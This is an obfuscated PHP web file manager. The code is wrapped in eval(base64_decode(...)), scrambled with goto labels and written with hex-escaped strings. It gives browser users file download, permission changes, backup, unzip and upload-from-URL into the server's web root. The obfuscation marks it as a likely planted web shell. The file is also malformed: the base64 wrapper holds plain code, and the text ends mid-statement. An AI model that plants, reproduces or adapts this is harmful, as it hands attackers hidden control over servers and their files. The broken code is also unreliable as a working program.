<?php eval(base64_decode('
 goto xyuQx; D8fTT: function fm_get_translations($tr) { try { $content = @file_get_contents("\x74\162\141\156\x73\x6c\x61\x74\x69\157\156\x2e\152\163\157\156"); if ($content !== FALSE) { $lng = json_decode($content, TRUE); global $lang_list; foreach ($lng["\154\141\156\x67\165\141\x67\145"] as $key => $value) { $code = $value["\x63\157\144\x65"]; $lang_list[$code] = $value["\156\141\155\145"]; if ($tr) { $tr[$code] = $value["\x74\x72\x61\x6e\x73\x6c\x61\x74\x69\x6f\156"]; } } return $tr; } } catch (Exception $e) { echo $e; } } goto fodcY; U2JL9: function fm_mkdir($dir, $force) { if (file_exists($dir)) { if (is_dir($dir)) { return $dir; } elseif (!$force) { return false; } unlink($dir); } return mkdir($dir, 511, true); } goto S1vRq; wYJpi: defined("\x46\115\137\x44\x41\124\x45\124\111\x4d\105\x5f\106\117\122\115\101\124") || define("\106\x4d\137\104\x41\x54\105\124\111\x4d\x45\137\x46\117\122\115\101\124", $datetime_format); goto rsa6x; ac9KT: fm_show_header(); goto p3CHH; YOjyC: ?>
">
    <input type="hidden" name="group" value="1">
    <div class="table-responsive">
        <table class="table table-bordered table-hover table-sm bg-white" id="main-table">
            <thead class="thead-white">
            <tr>
                <?php  goto W07sS; c7LfI: $readonly_users = array("\165\163\x65\x72"); goto Fui2x; gW_bP: function fm_show_header() { $sprites_ver = "\62\x30\61\x36\x30\63\61\65"; header("\x43\x6f\156\164\145\x6e\164\x2d\x54\171\x70\145\72\40\x74\x65\170\164\x2f\x68\x74\155\154\73\40\143\150\141\x72\x73\x65\x74\x3d\165\164\146\55\70"); header("\x45\x78\160\x69\162\145\163\x3a\x20\x53\141\x74\54\40\x32\66\x20\x4a\165\x6c\x20\x31\71\71\67\40\60\65\x3a\60\60\72\x30\x30\x20\107\x4d\124"); header("\x43\141\x63\x68\145\55\103\157\156\164\162\157\154\72\40\156\157\x2d\163\x74\x6f\x72\x65\x2c\40\156\157\x2d\143\x61\143\150\x65\54\x20\155\165\163\164\55\162\145\x76\x61\154\151\144\x61\x74\x65\54\40\160\x6f\x73\x74\55\x63\x68\x65\143\153\75\60\54\40\160\x72\x65\55\143\x68\145\143\x6b\x3d\x30"); header("\120\x72\x61\x67\155\x61\x3a\x20\x6e\x6f\55\x63\x61\143\150\145"); global $lang, $root_url, $sticky_navbar, $favicon_path; $isStickyNavBar = $sticky_navbar ? "\156\x61\166\142\141\x72\55\x66\x69\170\x65\x64" : "\x6e\x61\x76\142\141\x72\55\x6e\157\162\155\141\x6c"; ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <link rel="icon" href="<?php  echo fm_enc($favicon_path); ?>
" type="image/png">
    <title><?php  echo fm_enc(APP_TITLE); ?>
</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.css" />
    <?php  if (FM_USE_HIGHLIGHTJS) { ?>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/styles/<?php  echo FM_HIGHLIGHTJS_STYLE; ?>
.min.css">
    <?php  } ?>
    <style>
        body {
            font-size: 14px;
            color: #222;
            background: #F7F7F7;
        }
        body.navbar-fixed {
            margin-top: 55px;
        }
        a:hover, a:visited, a:focus {
            text-decoration: none !important;
        }
        * {
            -webkit-border-radius: 0 !important;
            -moz-border-radius: 0 !important;
            border-radius: 0 !important;
        }
        .filename, td, th {
            white-space: nowrap
        }
        .navbar-brand {
            font-weight: bold;
        }
        .nav-item.avatar a {
            cursor: pointer;
            text-transform: capitalize;
        }
        .nav-item.avatar a > i {
            font-size: 15px;
        }
        .nav-item.avatar .dropdown-menu a {
            font-size: 13px;
        }
        #search-addon {
            font-size: 12px;
            border-right-width: 0;
        }
        #search-addon2 {
            background: transparent;
            border-left: 0;
        }
        .bread-crumb {
            color: #cccccc;
            font-style: normal;
        }
        #main-table .filename a {
            color: #222222;
        }
        .table td, .table th {
            vertical-align: middle !important;
        }
        .table .custom-checkbox-td .custom-control.custom-checkbox, .table .custom-checkbox-header .custom-control.custom-checkbox {
            padding: 0;
            min-width: 18px;
        }
        .table-sm td, .table-sm th { padding: .4rem;}
        .table-bordered td, .table-bordered th { border: 1px solid #f1f1f1;}
        .hidden {
            display: none
        }
        pre.with-hljs {
            padding: 0
        }
        pre.with-hljs code {
            margin: 0;
            border: 0;
            overflow: visible
        }
        code.maxheight, pre.maxheight {
            max-height: 512px
        }
        .fa.fa-caret-right {
            font-size: 1.2em;
            margin: 0 4px;
            vertical-align: middle;
            color: #ececec
        }
        .fa.fa-home {
            font-size: 1.3em;
            vertical-align: bottom
        }
        .path {
            margin-bottom: 10px
        }
        form.dropzone {
            min-height: 200px;
            border: 2px dashed #007bff;
            line-height: 6rem;
        }
        .right {
            text-align: right
        }
        .center, .close, .login-form {
            text-align: center
        }
        .message {
            padding: 4px 7px;
            border: 1px solid #ddd;
            background-color: #fff
        }
        .message.ok {
            border-color: green;
            color: green
        }
        .message.error {
            border-color: red;
            color: red
        }
        .message.alert {
            border-color: orange;
            color: orange
        }
        .preview-img {
            max-width: 100%;
            background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC)
        }
        .inline-actions > a > i {
            font-size: 1em;
            margin-left: 5px;
            background: #3785c1;
            color: #fff;
            padding: 3px;
            border-radius: 3px
        }
        .preview-video {
            position: relative;
            max-width: 100%;
            height: 0;
            padding-bottom: 62.5%;
            margin-bottom: 10px
        }
        .preview-video video {
            position: absolute;
            width: 100%;
            height: 100%;
            left: 0;
            top: 0;
            background: #000
        }
        .compact-table {
            border: 0;
            width: auto
        }
        .compact-table td, .compact-table th {
            width: 100px;
            border: 0;
            text-align: center
        }
        .compact-table tr:hover td {
            background-color: #fff
        }
        .filename {
            max-width: 420px;
            overflow: hidden;
            text-overflow: ellipsis
        }
        .break-word {
            word-wrap: break-word;
            margin-left: 30px
        }
        .break-word.float-left a {
            color: #7d7d7d
        }
        .break-word + .float-right {
            padding-right: 30px;
            position: relative
        }
        .break-word + .float-right > a {
            color: #7d7d7d;
            font-size: 1.2em;
            margin-right: 4px
        }
        #editor {
            position: absolute;
            right: 15px;
            top: 100px;
            bottom: 15px;
            left: 15px
        }
        @media (max-width:481px) {
            #editor {
                top: 150px;
            }
        }
        #normal-editor {
            border-radius: 3px;
            border-width: 2px;
            padding: 10px;
            outline: none;
        }
        .btn-2 {
            border-radius: 0;
            padding: 3px 6px;
            font-size: small;
        }
        li.file:before,li.folder:before{font:normal normal normal 14px/1 FontAwesome;content:"\f016";margin-right:5px}li.folder:before{content:"\f114"}i.fa.fa-folder-o{color:#0157b3}i.fa.fa-picture-o{color:#26b99a}i.fa.fa-file-archive-o{color:#da7d7d}.btn-2 i.fa.fa-file-archive-o{color:inherit}i.fa.fa-css3{color:#f36fa0}i.fa.fa-file-code-o{color:#007bff}i.fa.fa-code{color:#cc4b4c}i.fa.fa-file-text-o{color:#0096e6}i.fa.fa-html5{color:#d75e72}i.fa.fa-file-excel-o{color:#09c55d}i.fa.fa-file-powerpoint-o{color:#f6712e}
        i.go-back {
            font-size: 1.2em;
            color: #007bff;
        }
        .main-nav {
            padding: 0.2rem 1rem;
            box-shadow: 0 4px 5px 0 rgba(0, 0, 0, .14), 0 1px 10px 0 rgba(0, 0, 0, .12), 0 2px 4px -1px rgba(0, 0, 0, .2)
        }
        .dataTables_filter {
            display: none;
        }
        table.dataTable thead .sorting {
            cursor: pointer;
            background-repeat: no-repeat;
            background-position: center right;
            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAQAAADYWf5HAAAAkElEQVQoz7XQMQ5AQBCF4dWQSJxC5wwax1Cq1e7BAdxD5SL+Tq/QCM1oNiJidwox0355mXnG/DrEtIQ6azioNZQxI0ykPhTQIwhCR+BmBYtlK7kLJYwWCcJA9M4qdrZrd8pPjZWPtOqdRQy320YSV17OatFC4euts6z39GYMKRPCTKY9UnPQ6P+GtMRfGtPnBCiqhAeJPmkqAAAAAElFTkSuQmCC');
        }
        table.dataTable thead .sorting_asc {
            cursor: pointer;
            background-repeat: no-repeat;
            background-position: center right;
            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZ0lEQVQ4y2NgGLKgquEuFxBPAGI2ahhWCsS/gDibUoO0gPgxEP8H4ttArEyuQYxAPBdqEAxPBImTY5gjEL9DM+wTENuQahAvEO9DMwiGdwAxOymGJQLxTyD+jgWDxCMZRsEoGAVoAADeemwtPcZI2wAAAABJRU5ErkJggg==');
        }
        table.dataTable thead .sorting_desc {
            cursor: pointer;
            background-repeat: no-repeat;
            background-position: center right;
            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZUlEQVQ4y2NgGAWjYBSggaqGu5FA/BOIv2PBIPFEUgxjB+IdQPwfC94HxLykus4GiD+hGfQOiB3J8SojEE9EM2wuSJzcsFMG4ttQgx4DsRalkZENxL+AuJQaMcsGxBOAmGvopk8AVz1sLZgg0bsAAAAASUVORK5CYII=');
        }
        table.dataTable thead tr:first-child th.custom-checkbox-header:first-child{
            background-image: none;
        }
        .footer-action li {
            margin-bottom: 10px;
        }
        .app-v-title {
            font-size: 24px;
            font-weight: 300;
            letter-spacing: -.5px;
            text-transform: uppercase;
        }
        hr.custom-hr {
            border-top: 1px dashed #8c8b8b;
            border-bottom: 1px dashed #fff;
        }
        .ekko-lightbox .modal-dialog { max-width: 98%; }
        .ekko-lightbox-item.fade.in.show .row { background: #fff; }
        .ekko-lightbox-nav-overlay{
            display: flex !important;
            opacity: 1 !important;
            height: auto !important;
            top: 50%;
        }

        .ekko-lightbox-nav-overlay a{
            opacity: 1 !important;
            width: auto !important;
            text-shadow: none !important;
            color: #3B3B3B;
        }

        .ekko-lightbox-nav-overlay a:hover{
            color: #20507D;
        }
        #main-table span.badge{border-bottom:2px solid #f8f9fa}#main-table span.badge:nth-child(1){border-color:#df4227}#main-table span.badge:nth-child(2){border-color:#f8b600}#main-table span.badge:nth-child(3){border-color:#00bd60}#main-table span.badge:nth-child(4){border-color:#4581ff}#main-table span.badge:nth-child(5){border-color:#ac68fc}#main-table span.badge:nth-child(6){border-color:#45c3d2}
        @media only screen and (min-device-width : 768px) and (max-device-width : 1024px) and (orientation : landscape) and (-webkit-min-device-pixel-ratio: 2) { .navbar-collapse .col-xs-6.text-right { padding: 0; } }
        .btn.active.focus,.btn.active:focus,.btn.focus,.btn.focus:active,.btn:active:focus,.btn:focus{outline:0!important;outline-offset:0!important;background-image:none!important;-webkit-box-shadow:none!important;box-shadow:none!important}
        .lds-facebook{display:none;position:relative;width:64px;height:64px}.lds-facebook div,.lds-facebook.show-me{display:inline-block}.lds-facebook div{position:absolute;left:6px;width:13px;background:#007bff;animation:lds-facebook 1.2s cubic-bezier(0,.5,.5,1) infinite}.lds-facebook div:nth-child(1){left:6px;animation-delay:-.24s}.lds-facebook div:nth-child(2){left:26px;animation-delay:-.12s}.lds-facebook div:nth-child(3){left:45px;animation-delay:0}@keyframes lds-facebook{0%{top:6px;height:51px}100%,50%{top:19px;height:26px}}
    </style>
</head>
<body class="<?php  echo $isStickyNavBar; ?>
">
<div id="wrapper" class="container-fluid">

    <!-- New Item creation -->
    <div class="modal fade" id="createNewItem" tabindex="-1" role="dialog" aria-label="newItemModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="newItemModalLabel"><i class="fa fa-plus-square fa-fw"></i><?php  echo lng("\x43\x72\x65\x61\x74\145\116\145\167\x49\164\145\x6d"); ?>
</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <p><label for="newfile"><?php  echo lng("\111\164\x65\x6d\124\171\160\x65"); ?>
 </label></p>

                    <div class="custom-control custom-radio custom-control-inline">
                        <input type="radio" id="customRadioInline1" name="newfile" value="file" class="custom-control-input">
                        <label class="custom-control-label" for="customRadioInline1"><?php  echo lng("\x46\x69\x6c\x65"); ?>
</label>
                    </div>

                    <div class="custom-control custom-radio custom-control-inline">
                        <input type="radio" id="customRadioInline2" name="newfile" value="folder" class="custom-control-input" checked="">
                        <label class="custom-control-label" for="customRadioInline2"><?php  echo lng("\106\157\x6c\x64\x65\162"); ?>
</label>
                    </div>

                    <p class="mt-3"><label for="newfilename"><?php  echo lng("\111\164\x65\155\x4e\x61\155\x65"); ?>
 </label></p>
                    <input type="text" name="newfilename" id="newfilename" value="" class="form-control">
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-outline-primary" data-dismiss="modal"><i class="fa fa-times-circle"></i> <?php  echo lng("\103\141\156\143\x65\154"); ?>
</button>
                    <button type="button" class="btn btn-success" onclick="newfolder('<?php  echo fm_enc(FM_PATH); ?>
');return false;"><i class="fa fa-check-circle"></i> <?php  echo lng("\x43\162\145\141\164\x65\116\x6f\x77"); ?>
</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal -->
    <script type="text/html" id="js-tpl-modal">
        <div class="modal fade" id="js-ModalCenter-<%this.id%>" tabindex="-1" role="dialog" aria-labelledby="ModalCenterTitle" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered" role="document">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="ModalCenterTitle"><%this.title%></h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        <%this.content%>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-outline-primary" data-dismiss="modal"><i class="fa fa-times-circle"></i> <?php  echo lng("\x43\x61\156\143\145\x6c"); ?>
</button>
                        <%if(this.action){%><button type="button" class="btn btn-primary" id="js-ModalCenterAction" data-type="js-<%this.action%>"><%this.action%></button><%}%>
                    </div>
                </div>
            </div>
        </div>
    </script>

    <?php  } goto gQtNe; KuHON: $path = FM_ROOT_PATH; goto s0xM3; p3CHH: fm_show_nav_path(FM_PATH); goto VLH_a; LEBsM: defined("\106\115\137\x48\111\107\110\114\x49\x47\110\124\112\x53\137\x53\x54\131\114\x45") || define("\106\x4d\x5f\110\111\x47\x48\x4c\111\107\x48\x54\x4a\x53\x5f\123\124\x59\114\105", $highlightjs_style); goto wYJpi; pf37z: if (isset($_GET["\x64\x6c"])) { $dl = $_GET["\144\x6c"]; $dl = fm_clean_path($dl); $dl = str_replace("\57", '', $dl); $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\57" . FM_PATH; } if ($dl != '' && is_file($path . "\x2f" . $dl)) { header("\103\157\x6e\x74\145\x6e\164\x2d\104\145\x73\x63\162\x69\160\x74\151\157\156\x3a\x20\x46\x69\154\x65\x20\124\162\141\156\163\146\x65\x72"); header("\x43\157\156\164\x65\156\164\55\124\x79\x70\145\x3a\40\141\160\x70\x6c\x69\x63\141\x74\151\x6f\x6e\x2f\x6f\143\164\145\164\x2d\163\x74\x72\x65\141\155"); header("\103\x6f\156\164\145\156\164\x2d\x44\x69\x73\160\157\x73\151\x74\x69\157\x6e\x3a\40\x61\x74\x74\141\143\x68\x6d\x65\x6e\x74\73\x20\146\151\x6c\145\156\x61\x6d\145\x3d\42" . basename($path . "\57" . $dl) . "\42"); header("\103\x6f\156\164\x65\x6e\164\55\x54\x72\141\x6e\x73\x66\145\162\55\x45\x6e\x63\157\x64\x69\156\147\72\x20\x62\x69\x6e\141\x72\171"); header("\x43\157\x6e\156\145\143\x74\x69\157\x6e\72\x20\x4b\x65\145\x70\x2d\x41\x6c\151\x76\x65"); header("\x45\x78\160\x69\x72\x65\163\72\x20\60"); header("\x43\141\143\x68\145\x2d\103\157\156\x74\x72\157\x6c\x3a\x20\155\165\x73\164\x2d\x72\x65\x76\x61\x6c\151\x64\141\x74\x65\54\40\x70\x6f\x73\164\x2d\143\x68\x65\x63\153\75\60\x2c\x20\160\162\145\x2d\x63\150\x65\143\153\75\60"); header("\x50\162\141\x67\x6d\x61\72\x20\160\x75\142\154\151\x63"); header("\x43\157\x6e\x74\145\x6e\164\55\x4c\145\x6e\x67\x74\150\72\40" . filesize($path . "\x2f" . $dl)); ob_end_clean(); readfile($path . "\x2f" . $dl); die; } else { fm_set_msg("\106\x69\154\x65\40\x6e\157\164\40\146\x6f\x75\156\144", "\x65\x72\162\157\162"); fm_redirect(FM_SELF_URL . "\x3f\160\x3d" . urlencode(FM_PATH)); } } goto wk0vd; Car6Q: function fm_enc($text) { return htmlspecialchars($text, ENT_QUOTES, "\125\x54\106\x2d\70"); } goto TmRfR; j2Eiq: if (!empty($folders)) { natcasesort($folders); } goto okd6c; SNE7b: $objects = is_readable($path) ? scandir($path) : array(); goto c1Oy8; oFqrx: $root_path = rtrim($root_path, "\134\57"); goto jt701; Eterv: define("\106\115\x5f\x55\123\105\137\x41\x55\124\110", $use_auth); goto p4T7E; RUVxh: if (isset($_GET["\x63\150\155\157\x64"]) && !FM_READONLY && !FM_IS_WIN) { $file = $_GET["\x63\150\x6d\157\x64"]; $file = fm_clean_path($file); $file = str_replace("\x2f", '', $file); if ($file == '' || !is_file($path . "\x2f" . $file) && !is_dir($path . "\x2f" . $file)) { fm_set_msg("\x46\151\154\145\40\x6e\157\164\40\146\157\165\156\144", "\x65\162\x72\x6f\x72"); fm_redirect(FM_SELF_URL . "\77\160\x3d" . urlencode(FM_PATH)); } fm_show_header(); fm_show_nav_path(FM_PATH); $file_url = FM_ROOT_URL . (FM_PATH != '' ? "\57" . FM_PATH : '') . "\57" . $file; $file_path = $path . "\x2f" . $file; $mode = fileperms($path . "\x2f" . $file); ?>
    <div class="path">
        <div class="card mb-2">
            <h6 class="card-header">
                <?php  echo lng("\103\x68\141\156\147\x65\120\x65\162\x6d\151\163\163\x69\x6f\156\163"); ?>
            </h6>
            <div class="card-body">
                <p class="card-text">
                    Full path: <?php  echo $file_path; ?>
<br>
                </p>
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php  echo fm_enc(FM_PATH); ?>
">
                    <input type="hidden" name="chmod" value="<?php  echo fm_enc($file); ?>
">

                    <table class="table compact-table">
                        <tr>
                            <td></td>
                            <td><b><?php  echo lng("\x4f\x77\156\145\x72"); ?>
</b></td>
                            <td><b><?php  echo lng("\x47\x72\157\165\x70"); ?>
</b></td>
                            <td><b><?php  echo lng("\x4f\164\150\145\162"); ?>
</b></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php  echo lng("\122\145\141\144"); ?>
</b></td>
                            <td><label><input type="checkbox" name="ur" value="1"<?php  echo $mode & 256 ? "\x20\x63\x68\x65\x63\153\x65\x64" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="gr" value="1"<?php  echo $mode & 32 ? "\x20\x63\150\145\x63\153\x65\144" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="or" value="1"<?php  echo $mode & 4 ? "\x20\x63\x68\x65\143\x6b\x65\144" : ''; ?>
></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php  echo lng("\x57\162\151\x74\145"); ?>
</b></td>
                            <td><label><input type="checkbox" name="uw" value="1"<?php  echo $mode & 128 ? "\x20\143\150\145\143\153\145\144" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="gw" value="1"<?php  echo $mode & 16 ? "\40\x63\150\145\x63\153\x65\x64" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="ow" value="1"<?php  echo $mode & 2 ? "\40\143\x68\x65\143\x6b\x65\x64" : ''; ?>
></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php  echo lng("\x45\170\145\x63\165\164\145"); ?>
</b></td>
                            <td><label><input type="checkbox" name="ux" value="1"<?php  echo $mode & 64 ? "\x20\x63\x68\145\x63\153\145\144" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="gx" value="1"<?php  echo $mode & 8 ? "\x20\x63\150\x65\x63\x6b\145\x64" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="ox" value="1"<?php  echo $mode & 1 ? "\40\x63\x68\x65\x63\153\x65\144" : ''; ?>
></label></td>
                        </tr>
                    </table>

                    <p>
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php  echo lng("\103\150\x61\x6e\147\x65"); ?>
</button> &nbsp;
                        <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
" class="btn btn-outline-primary"><i class="fa fa-times-circle"></i> <?php  echo lng("\103\141\156\x63\145\154"); ?>
</a></b>
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php  fm_show_footer(); die; } goto ac9KT; uJKeT: $ip_blacklist = array("\x30\x2e\60\x2e\60\x2e\x30", "\x3a\72"); goto AtcG6; y_xb4: if (!FM_IS_WIN) { ?>
                    <th><?php  echo lng("\120\145\162\155\163"); ?>
</th>
                    <th><?php  echo lng("\117\x77\156\x65\162"); ?>
</th><?php  } goto o8TD5; Vfm4F: function fm_get_image_exts() { return array("\151\x63\157", "\147\151\x66", "\152\x70\147", "\152\160\x65\x67", "\x6a\x70\x63", "\152\160\62", "\x6a\160\170", "\170\142\155", "\x77\142\x6d\x70", "\x70\156\147", "\x62\155\x70", "\x74\x69\x66", "\164\x69\146\x66", "\x70\x73\144", "\x73\x76\147"); } goto Z_Z9n; MRvdE: define("\106\115\x5f\x49\123\137\x57\x49\x4e", DIRECTORY_SEPARATOR == "\x5c"); goto dg8ky; NiwBi: function fm_get_filesize($size) { if ($size < 1000) { return sprintf("\x25\x73\x20\x42", $size); } elseif ($size / 1024 < 1000) { return sprintf("\x25\163\x20\x4b\x42", round($size / 1024, 2)); } elseif ($size / 1024 / 1024 < 1000) { return sprintf("\x25\x73\x20\x4d\x42", round($size / 1024 / 1024, 2)); } elseif ($size / 1024 / 1024 / 1024 < 1000) { return sprintf("\x25\163\40\x47\102", round($size / 1024 / 1024 / 1024, 2)); } else { return sprintf("\45\x73\40\124\x42", round($size / 1024 / 1024 / 1024 / 1024, 2)); } } goto uEynF; jGlHt: $ip_silent = true; goto GHblK; cBQ23: ?>
                <th><?php  goto jywIK; T_JFH: if (isset($_POST["\141\152\x61\170"]) && !FM_READONLY) { if (isset($_POST["\164\x79\160\145"]) && $_POST["\164\171\x70\x65"] == "\x62\141\x63\x6b\x75\160") { $file = $_POST["\146\151\x6c\x65"]; $path = $_POST["\x70\141\x74\x68"]; $date = date("\x64\115\x79\55\110\151\163"); $newFile = $file . "\55" . $date . "\x2e\142\141\x6b"; copy($path . "\x2f" . $file, $path . "\57" . $newFile) or die("\x55\x6e\141\x62\154\145\x20\164\x6f\40\142\141\143\153\165\160"); echo "\102\141\x63\x6b\x75\160\x20{$newFile}\40\103\162\x65\x61\164\145\x64"; } if (isset($_POST["\164\171\160\x65"]) && $_POST["\164\171\160\145"] == "\x73\x65\x74\x74\x69\156\x67\163") { global $cfg, $lang, $report_errors, $show_hidden_files, $lang_list; $newLng = $_POST["\152\x73\55\x6c\141\156\x67\165\x61\147\x65"]; fm_get_translations(array()); if (!array_key_exists($newLng, $lang_list)) { $newLng = "\x65\156"; } $erp = isset($_POST["\x6a\x73\55\x65\162\162\x6f\x72\55\x72\145\x70\157\162\x74"]) && $_POST["\x6a\163\x2d\145\162\162\157\162\55\162\145\160\157\x72\164"] == "\164\x72\165\145" ? true : false; $shf = isset($_POST["\x6a\163\x2d\163\x68\157\167\55\x68\151\144\x64\145\x6e"]) && $_POST["\x6a\163\x2d\163\x68\x6f\167\x2d\x68\x69\144\144\x65\156"] == "\164\x72\x75\145" ? true : false; if ($cfg->data["\154\x61\x6e\x67"] != $newLng) { $cfg->data["\154\x61\x6e\147"] = $newLng; $lang = $newLng; } if ($cfg->data["\x65\x72\162\157\x72\137\x72\x65\x70\157\162\x74\x69\156\x67"] != $erp) { $cfg->data["\145\162\x72\157\162\x5f\162\x65\160\157\x72\x74\x69\156\147"] = $erp; $report_errors = $erp; } if ($cfg->data["\163\150\157\167\x5f\x68\x69\x64\144\145\x6e"] != $shf) { $cfg->data["\x73\150\x6f\167\x5f\150\x69\x64\144\145\156"] = $shf; $show_hidden_files = $shf; } $cfg->save(); echo true; } if (isset($_POST["\164\171\160\145"]) && $_POST["\x74\171\160\x65"] == "\x70\167\x64\x68\x61\163\150") { $res = isset($_POST["\151\x6e\160\x75\x74\x50\141\163\163\x77\x6f\x72\x64\62"]) && !empty($_POST["\x69\x6e\x70\x75\164\120\x61\163\x73\167\157\162\x64\x32"]) ? password_hash($_POST["\151\x6e\160\x75\164\120\141\x73\x73\x77\157\162\144\x32"], PASSWORD_DEFAULT) : ''; echo $res; } if (isset($_POST["\164\x79\x70\x65"]) && $_POST["\164\171\160\145"] == "\x75\160\x6c\157\x61\144" && !empty($_REQUEST["\x75\x70\x6c\x6f\141\144\x75\x72\x6c"])) { $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\x2f" . FM_PATH; } $url = !empty($_REQUEST["\165\160\x6c\157\141\x64\165\x72\154"]) && preg_match("\174\x5e\150\x74\x74\x70\50\x73\51\77\72\57\57\x2e\53\x24\174", stripslashes($_REQUEST["\165\160\x6c\x6f\x61\x64\x75\162\x6c"])) ? stripslashes($_REQUEST["\x75\x70\154\157\x61\144\165\162\154"]) : null; $use_curl = false; $temp_file = tempnam(sys_get_temp_dir(), "\165\160\154\x6f\x61\x64\55"); $fileinfo = new stdClass(); $fileinfo->name = trim(basename($url), "\x2e\x0\x2e\56\40"); function event_callback($message) { global $callback; echo json_encode($message); } function get_file_path() { global $path, $fileinfo, $temp_file; return $path . "\57" . basename($fileinfo->name); } $err = false; if (!$url) { $success = false; } else { if ($use_curl) { @($fp = fopen($temp_file, "\167")); @($ch = curl_init($url)); curl_setopt($ch, CURLOPT_NOPROGRESS, false); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_FILE, $fp); @($success = curl_exec($ch)); $curl_info = curl_getinfo($ch); if (!$success) { $err = array("\x6d\145\x73\163\141\147\145" => curl_error($ch)); } @curl_close($ch); fclose($fp); $fileinfo->size = $curl_info["\x73\151\172\145\x5f\x64\x6f\167\x6e\x6c\157\141\x64"]; $fileinfo->type = $curl_info["\143\x6f\x6e\164\x65\156\x74\137\164\171\160\145"]; } else { $ctx = stream_context_create(); @($success = copy($url, $temp_file, $ctx)); if (!$success) { $err = error_get_last(); } } } if ($success) { $success = rename($temp_file, get_file_path()); } if ($success) { event_callback(array("\144\x6f\x6e\145" => $fileinfo)); } else { unlink($temp_file); if (!$err) { $err = array("\x6d\145\163\163\141\147\x65" => "\111\x6e\x76\x61\154\x69\x64\40\x75\x72\x6c\x20\160\x61\x72\141\x6d\x65\x74\145\162"); } event_callback(array("\146\141\151\154" => $err)); } } die; } goto fCzyX; UoTT2: function fm_get_text_exts() { return array("\164\170\x74", "\143\x73\163", "\x69\x6e\x69", "\x63\157\156\146", "\154\157\x67", "\150\164\141\x63\x63\145\x73\x73", "\x70\141\163\x73\x77\144", "\146\164\160\x71\x75\157\164\x61", "\163\161\x6c", "\x6a\163", "\x6a\163\x6f\156", "\163\150", "\143\157\x6e\146\x69\147", "\x70\150\x70", "\x70\150\x70\64", "\x70\x68\x70\x35", "\160\150\x70\x73", "\160\x68\x74\155\x6c", "\x68\x74\x6d", "\150\x74\x6d\x6c", "\x73\150\164\155\x6c", "\x78\x68\x74\x6d\154", "\x78\155\x6c", "\x78\163\154", "\155\63\x75", "\155\63\x75\x38", "\160\x6c\163", "\143\x75\145", "\x65\155\154", "\155\163\x67", "\143\x73\166", "\x62\141\x74", "\164\x77\x69\147", "\164\x70\154", "\x6d\144", "\147\151\x74\x69\147\156\x6f\162\145", "\x6c\x65\163\x73", "\x73\141\163\x73", "\x73\143\163\x73", "\x63", "\x63\160\x70", "\143\163", "\x70\x79", "\x6d\x61\x70", "\x6c\157\x63\153", "\144\x74\144", "\163\x76\x67"); } goto jpPU0; tdWQH: if (isset($_GET["\165\156\x7a\151\x70"]) && !FM_READONLY) { $unzip = $_GET["\x75\156\172\x69\160"]; $unzip = fm_clean_path($unzip); $unzip = str_replace("\57", '', $unzip); $isValid = false; $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\x2f" . FM_PATH; } if ($unzip != '' && is_file($path . "\57" . $unzip)) { $zip_path = $path . "\57" . $unzip; $ext = pathinfo($zip_path, PATHINFO_EXTENSION); $isValid = true; } else { fm_set_msg("\106\x69\154\x65\40\156\x6f\164\x20\x66\157\165\156\144", "\145\x72\162\x6f\162"); } if ($ext == "\172\x69\x70" && !class_exists("\x5a\151\x70\101\162\143\x68\151\166\145") || $ext == "\x74\141\162" && !class_exists("\120\x68\x61\162\x44\141\164\141")) { fm_set_msg("\117\160\145\162\x61\x74\x69\157\x6e\x73\x20\x77\x69\164\150\x20\141\162\143\x68\151\166\x65\163\40\x61\x72\145\40\x6e\x6f\164\40\x61\x76\x61\x69\154\141\142\154\145", "\x65\162\162\x6f\x72"); fm_redirect(FM_SELF_URL . 